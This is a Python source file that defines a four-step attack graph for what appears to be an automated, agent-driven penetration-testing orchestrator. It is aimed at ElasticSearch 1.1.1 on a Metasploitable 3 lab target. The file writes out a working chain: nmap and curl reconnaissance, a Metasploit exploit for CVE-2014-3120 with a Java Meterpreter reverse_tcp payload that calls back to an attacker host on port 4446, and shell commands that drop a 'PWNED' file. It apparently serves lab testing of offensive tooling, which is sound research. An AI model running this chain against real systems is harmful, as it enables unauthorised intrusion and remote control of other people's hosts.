"""
Example Attack Graph: ElasticSearch MVEL RCE (Metasploitable 3)

Unauthenticated JSON-API exploit chain against MS3's ElasticSearch 1.1.1
on port 9200. CVE-2014-3120 lets an unauthenticated attacker submit MVEL
script expressions through the _search endpoint, which Metasploit
weaponizes into a Java Meterpreter session.

This is the SHORTEST of the three baseline graphs -- recon, fingerprint,
exploit, action -- four nodes total. Tests the orchestrator's behavior
on minimal chains.

Chain:
  recon            — nmap full scan
  es_fingerprint   — curl the / endpoint to confirm ES 1.x with dynamic scripting
  es_rce           — exploit/multi/elasticsearch/script_mvel_rce -> java meterpreter
  file_drop        — write proof-of-compromise file from the session
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_elasticsearch_rce_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via ElasticSearch 1.1.1 "
                  "on port 9200 using CVE-2014-3120 (dynamic MVEL scripting). "
                  "Land a Java Meterpreter session and drop a proof-of-compromise "
                  "file.",
        target_ip=target_ip,
        name=f"elasticsearch_rce_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="ElasticSearch MVEL unauth RCE baseline against MS3.",
        metadata={"scenario": "elasticsearch_mvel_rce", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Nmap Full Scan",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's attack surface and confirm ElasticSearch on 9200",
        objective=f"Full port scan with service versioning on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -sV --top-ports 1000 {target_ip}"],
        tags=["nmap", "full_scan"],
    ))

    graph.add_node(AttackNode(
        id="es_fingerprint",
        label="ElasticSearch Version Fingerprint",
        tactic=Tactic.DISCOVERY.value,
        technique_id="T1592.002",
        technique_name="Gather Victim Host Info: Software",
        agent_type="recon",
        goal="Confirm ES version is in the vulnerable 1.x range (dynamic scripting on)",
        objective=f"Curl http://{target_ip}:9200/ to read the version banner.",
        target_ip=target_ip,
        tool_name="ssh",
        commands_to_run=[
            f"curl -sS --max-time 10 http://{target_ip}:9200/",
            f"curl -sS --max-time 10 http://{target_ip}:9200/_nodes",
        ],
        max_retries=1,
        tags=["elasticsearch", "fingerprint", "version_check"],
    ))

    graph.add_node(AttackNode(
        id="es_rce",
        label="ElasticSearch MVEL RCE",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Obtain a session via ES dynamic script execution",
        objective=f"Run exploit/multi/elasticsearch/script_mvel_rce against "
                  f"{target_ip}:9200; payload java/meterpreter/reverse_tcp.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/multi/elasticsearch/script_mvel_rce",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 9200,
            "TARGETURI": "/",
        },
        payload="java/meterpreter/reverse_tcp",
        payload_options={
            "LHOST": attacker_ip,
            "LPORT": 4446,
        },
        max_retries=3,
        tags=["elasticsearch", "mvel", "rce", "meterpreter", "unauth"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate ElasticSearch compromise with a written artifact",
        objective="Write a proof-of-compromise file via the session.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "id",
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned_elasticsearch.txt",
            "marker": "PWNED via ElasticSearch MVEL RCE",
        },
        command_params_alternatives={
            "target_file": ["/var/tmp/pwned_elasticsearch.txt", "/dev/shm/pwned_elasticsearch.txt"],
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned_elasticsearch.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "es_fingerprint",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 9200},
                description="ElasticSearch service is open on 9200",
            ),
        ],
        evidence="Nmap found ElasticSearch on port 9200",
        rationale="Fingerprint the ES version before firing the exploit",
    )

    graph.connect(
        "es_fingerprint", "es_rce",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="ES responded to version probe",
            ),
        ],
        evidence="ElasticSearch 1.1.1 confirmed -- vulnerable to MVEL injection",
        rationale="Fire the MVEL RCE exploit to land a session",
    )

    graph.connect(
        "es_rce", "file_drop",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="Java meterpreter session opened",
            ),
        ],
        evidence="Got Java meterpreter session via ElasticSearch",
        rationale="Drop the proof-of-compromise file as the impact step",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_elasticsearch_rce_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/elasticsearch_rce_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
